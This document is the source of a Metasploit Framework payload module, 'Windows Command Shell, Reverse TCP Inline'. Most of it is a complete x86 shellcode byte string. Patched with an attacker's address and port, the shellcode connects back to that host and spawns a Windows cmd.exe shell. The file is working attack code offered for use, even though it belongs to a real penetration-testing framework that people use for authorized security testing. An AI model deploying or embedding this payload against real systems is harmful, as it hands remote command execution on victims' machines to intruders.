##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3
  extend  Metasploit::Framework::Module::Ancestor::Handler

  include Msf::Payload::Windows
  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  handler module_name: 'Msf::Handler::ReverseTcp'

  def initialize(info = {})
    super(
        Msf::Module::ModuleInfo.merge!(
            info,
            'Name'          => 'Windows Command Shell, Reverse TCP Inline',
            'Description'   => 'Connect back to attacker and spawn a command shell',
            'Author'        => [ 'vlad902', 'sf' ],
            'License'       => MSF_LICENSE,
            'Platform'      => 'Windows',
            'Arch'          => ARCH_X86,
            'Session'       => Msf::Sessions::CommandShell,
            'Payload'       =>
                {
                    'Offsets' =>
                        {
                            'LPORT'    => [ 203, 'n'    ],
                            'LHOST'    => [ 196, 'ADDR' ],
                            'EXITFUNC' => [ 284, 'V'    ],
                        },
                    'Payload' =>
                        "\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
                            "\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
                            "\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
                            "\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
                            "\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
                            "\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
                            "\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
                            "\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
                            "\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
                            "\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07" +
                            "\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00" +
                            "\xFF\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF" +
                            "\xD5\x89\xC7\x68\x7F\x00\x00\x01\x68\x02\x00\x11\x5C\x89\xE6\x6A" +
                            "\x10\x56\x57\x68\x99\xA5\x74\x61\xFF\xD5\x68\x63\x6D\x64\x00\x89" +
                            "\xE3\x57\x57\x57\x31\xF6\x6A\x12\x59\x56\xE2\xFD\x66\xC7\x44\x24" +
                            "\x3C\x01\x01\x8D\x44\x24\x10\xC6\x00\x44\x54\x50\x56\x56\x56\x46" +
                            "\x56\x4E\x56\x56\x53\x56\x68\x79\xCC\x3F\x86\xFF\xD5\x89\xE0\x4E" +
                            "\x56\x46\xFF\x30\x68\x08\x87\x1D\x60\xFF\xD5\xBB\xE0\x1D\x2A\x0A" +
                            "\x68\xA6\x95\xBD\x9D\xFF\xD5\x3C\x06\x7C\x0A\x80\xFB\xE0\x75\x05" +
                            "\xBB\x47\x13\x72\x6F\x6A\x00\x53\xFF\xD5"
                }
        )
    )
  end

end
